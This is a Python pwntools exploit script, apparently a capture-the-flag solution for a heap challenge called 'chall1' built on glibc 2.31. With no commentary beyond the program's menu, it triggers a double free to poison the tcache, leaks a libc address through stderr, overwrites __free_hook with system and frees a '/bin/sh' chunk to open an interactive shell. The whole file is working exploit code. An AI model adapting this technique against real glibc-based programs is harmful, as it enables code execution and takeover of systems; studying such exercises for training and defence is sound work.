from pwn import *
context.binary = exe = ELF('chall1', checksec=False)
libc = ELF('libc-2.31.so', checksec=False)

# 1. Buy a book
# 2. Write to book
# 3. Erase content of book
# 4. Read the book
# 5. Exit
# > 1
# Size: 20
# Content: 

p = exe.process()
input()
p.sendlineafter(b'>', b"1")
p.sendlineafter(b'Size: ', b'20')
p.sendafter(b'Content: ', b"A"*20)

p.sendlineafter(b'>', b"3")

p.sendlineafter(b'>', b"2")
p.sendafter(b'Content: ', b'\0'*16)

p.sendlineafter(b'>', b"3")

p.sendlineafter(b'>', b"2")
p.sendafter(b'Content: ', p64(exe.sym['stderr']))

p.sendlineafter(b'>', b"1")
p.sendlineafter(b': ', b'20')
p.sendafter(b'Content: ', b"1")

p.sendlineafter(b'>', b"1")
p.sendlineafter(b': ', b'20')
p.sendafter(b'Content: ', b"1")

p.sendlineafter(b"> ", b"4")

p.recvuntil(b"Content: ")
leak = u64(p.recv(6).ljust(8, b'\0'))
libc.address = leak - 0x1ed531
log.success('libc base: ' + hex(libc.address))

p.sendlineafter(b'>', b"1")
p.sendlineafter(b'Size: ', b'20')
p.sendafter(b'Content: ', b"A"*20)

p.sendlineafter(b'>', b"3")

p.sendlineafter(b'>', b"2")
p.sendafter(b'Content: ', b'\0'*16)

p.sendlineafter(b'>', b"3")

p.sendlineafter(b'>', b"2")
p.sendafter(b'Content: ', p64(libc.sym['__free_hook']))

p.sendlineafter(b'>', b"1")
p.sendlineafter(b': ', b'20')
p.sendafter(b'Content: ', b"1")

p.sendlineafter(b'>', b"1")
p.sendlineafter(b': ', b'20')
p.sendafter(b'Content: ', b"1")

p.sendlineafter(b'>', b"2")
p.sendafter(b'Content: ', p64(libc.sym['system']))

p.sendlineafter(b'>', b"1")
p.sendlineafter(b': ', b'20')
p.sendafter(b'Content: ', b"/bin/sh\0")

p.sendlineafter(b'>', b"3")

p.interactive()


